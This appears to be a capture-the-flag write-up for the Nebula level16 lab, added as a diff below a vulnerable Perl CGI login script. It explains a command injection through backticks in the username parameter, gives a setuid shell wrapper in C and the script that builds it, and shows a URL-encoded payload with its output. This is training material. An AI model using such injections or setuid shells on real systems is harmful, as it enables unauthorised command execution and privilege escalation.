@@ -59,3 +59,80 @@ sub htmlz {
 
 htmlz(login(param("username"), param("password")));
 
+
+Code Analysis
+a. use CGI qw{param}
+- This perl program uses Function Oriented Programming and import param function which can be used like param("username") to get
+  the value of username parameter of URI
+b. param("username") and param("password") 
+- It returns a parameter value which is being sent with the form of index.cgi?username=your_username&password=your_pw
+c. login(param("username"), param("password"))
+- With the retrieved username, all lowercase characters are changed into uppercase ($username=~tr/a-z/A-Z/;)
+- Then any trailing string after a space will be removed.
+d.  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
+- Line including all filters applied username is serarched from /home/flag16/userdb.txt and the line is returned.
+- From the returned line, password filed is extracted and if the extracted password is same to provieded password, return 1. Otherwise 0
+
+Vulnerability and exploit plan
+- The line of `egrep "^$username" /home/flag16/userdb.txt 2>&1` can excute anything provided by properly manipulating $username portion
+- As we are passing the parameters thorugh URL, we need proper URL encoding.
+- To avoid uppercase challenge, use /*/ and uppercase file name
+  : e.g. To specify /tmp/GETSH => /*/GETSH
+
+Sol A - Simply get flag
+1. /tmp/shell.c + Shell script file(/tmp/GETSH) compiling and setting setuid
+// /tmp/shell.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+int main(){
+    uid_t uid = geteuid();
+    setresuid(uid, uid, uid);
+    system("/bin/sh");
+    return 0;
+
+}
+
+// /tmp/GETSH
+#!/bin/sh
+gcc -o /home/flag16/shell /tmp/shell.c
+chmod +s /home/flag16/shell
+
+// Add execute permission to GETSH
+$chmod 755 /tmp/GETSH
+
+2. URI parameter setup
+ - Use bash trick /*/ to avoid uppser case challenge
+  : /*/GETSH
+ - URL enconding (`-> %60, /->%2F, *->%2A)
+  : index.cgi?username=`/*/GETSH`&password= ==> index.cgi?username=%60%2F%2A%2FGETSH%60&password=
+
+3. Execute: http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password=
+Your login failed
+Would you like a cookie?
+
+level16@nebula:/home/flag16$ ls -al /home/flag16/shell
+-rwsr-sr-x 1 flag16 flag16 7240 2019-02-21 05:56 /home/flag16/shell
+
+level16@nebula:/home/flag16$ ./shell
+sh-4.2$ id
+uid=983(flag16) gid=1017(level16) egid=983(flag16) groups=983(flag16),1017(level16)
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+
+A little bit different way to simply get flag.
+// /tmp/GETSH
+#!/bin/sh
+gcc -o /home/flag16/shell /tmp/shell.c
+/bin/getflag > /tmp/showflag
+chmod +s /home/flag16/shell
+
+Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password= with browser.
+
+level16@nebula:/tmp$ more /tmp/showflag
+You have successfully executed getflag on a target account
+
+Sol B - To get flag16 shell by using Revershell
+http://www.pwntester.com/blog/2013/11/26/nebula-level16-write-up/
+
